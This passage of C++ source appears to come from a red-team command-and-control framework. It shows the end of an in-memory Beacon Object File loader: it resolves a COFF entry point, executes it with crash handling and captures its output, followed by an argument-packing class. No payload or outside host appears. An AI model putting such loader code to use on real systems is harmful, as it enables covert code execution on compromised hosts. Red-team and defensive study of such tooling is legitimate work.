        currentOffset += alignedSize;
    }

    // -----------------------------------------------------------------------
    // Step 9: Find entry point ("go" function or custom function_name)
    // -----------------------------------------------------------------------
    void* entryPoint = nullptr;
    std::string searchName = function_name.empty() ? "go" : function_name;

    // We need to search for:
    //   "go", "_go" (MinGW cdecl prefix), or the custom function_name
    for (uint32_t i = 0; i < header->NumberOfSymbols; i++) {
        const COFFSymbol* sym = &symbols[i];

        // Only consider defined symbols (section > 0)
        if (sym->SectionNumber <= 0) {
            i += sym->NumberOfAuxSymbols;
            continue;
        }

        // Only consider external or label symbols
        if (sym->StorageClass != IMAGE_SYM_CLASS_EXTERNAL &&
            sym->StorageClass != IMAGE_SYM_CLASS_LABEL) {
            i += sym->NumberOfAuxSymbols;
            continue;
        }

        std::string symName = GetSymbolName(sym, stringTable);

        // Check for exact match or underscore-prefixed match
        if (symName == searchName ||
            symName == "_" + searchName ||
            symName == searchName + "@0" ||      // stdcall decoration
            symName == "_" + searchName + "@0" || // stdcall with underscore
            symName == searchName + "@8" ||       // stdcall with 2 args (char*, int)
            symName == "_" + searchName + "@8") {
            entryPoint = (void*)symbolAddresses[i];
            break;
        }

        i += sym->NumberOfAuxSymbols;
    }

    if (!entryPoint) {
        VirtualFree(imageBase, 0, MEM_RELEASE);
        result.output = "BOF: entry point '" + searchName + "' not found";
        return result;
    }

    // -----------------------------------------------------------------------
    // Step 10: Reset output buffer and execute the BOF
    // -----------------------------------------------------------------------
    ResetOutputBuffer();

    // Entry point signature: void entry(char* args, int args_len)
    typedef void (*bof_entry)(char*, int);
    bof_entry entry = (bof_entry)entryPoint;

    char* argsPtr = nullptr;
    int argsLen = 0;
    if (!args.empty()) {
        argsPtr = (char*)args.data();
        argsLen = (int)args.size();
    }

    // Execute the BOF entry point
    result.exit_code = 0;
    result.success = true;

#ifdef _MSC_VER
    // MSVC: use SEH to catch crashes
    __try {
        entry(argsPtr, argsLen);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        DWORD exCode = GetExceptionCode();
        result.success = false;
        result.exit_code = (int)exCode;
        char excBuf[256];
        snprintf(excBuf, sizeof(excBuf),
                 "BOF crashed with exception 0x%08lX", exCode);
        AppendToOutputBuffer(excBuf, (size_t)strlen(excBuf));
    }
#else
    // MinGW/GCC: direct call (no SEH available)
    entry(argsPtr, argsLen);
#endif

    // -----------------------------------------------------------------------
    // Step 11: Capture output and cleanup
    // -----------------------------------------------------------------------
    if (g_bof_output && g_bof_output_len > 0) {
        result.output = std::string(g_bof_output, g_bof_output_len);
    } else if (result.success) {
        result.output = "BOF executed successfully (no output)";
    }

    ResetOutputBuffer();

    // Free the allocated memory
    VirtualFree(imageBase, 0, MEM_RELEASE);

    // Clear the import storage (pointers are no longer valid after VirtualFree)
    s_resolvedImports.clear();

#else
    // -----------------------------------------------------------------------
    // POSIX: BOFs are Windows COFF object files and cannot run here
    // -----------------------------------------------------------------------
    (void)function_name;
    (void)args;
    (void)bof_data;
    result.output = "BOF execution requires Windows (COFF object files are Windows-only)";
    result.success = false;
    result.exit_code = -1;
#endif

    return result;
}

// ============================================================================
// ArgPacker implementation
// ============================================================================
ArgPacker::ArgPacker() {}

void ArgPacker::AddShort(uint16_t value) {
    buffer_.push_back(static_cast<uint8_t>(value & 0xFF));
    buffer_.push_back(static_cast<uint8_t>((value >> 8) & 0xFF));
}

void ArgPacker::AddInt(uint32_t value) {
    buffer_.push_back(static_cast<uint8_t>(value & 0xFF));
    buffer_.push_back(static_cast<uint8_t>((value >> 8) & 0xFF));
    buffer_.push_back(static_cast<uint8_t>((value >> 16) & 0xFF));
    buffer_.push_back(static_cast<uint8_t>((value >> 24) & 0xFF));
}

void ArgPacker::AddString(const std::string& value) {
    uint32_t len = static_cast<uint32_t>(value.size() + 1);
    AddInt(len);
    buffer_.insert(buffer_.end(), value.begin(), value.end());
    buffer_.push_back(0); // null terminator
}

void ArgPacker::AddWString(const std::wstring& value) {
    uint32_t len = static_cast<uint32_t>((value.size() + 1) * sizeof(wchar_t));
    AddInt(len);
    const uint8_t* data = reinterpret_cast<const uint8_t*>(value.c_str());
    buffer_.insert(buffer_.end(), data, data + len);
}

void ArgPacker::AddData(const uint8_t* data, size_t length) {
    AddInt(static_cast<uint32_t>(length));
    buffer_.insert(buffer_.end(), data, data + length);
}

std::vector<uint8_t> ArgPacker::GetBuffer() const {
    return buffer_;
}

} // namespace bof
} // namespace rtlc2
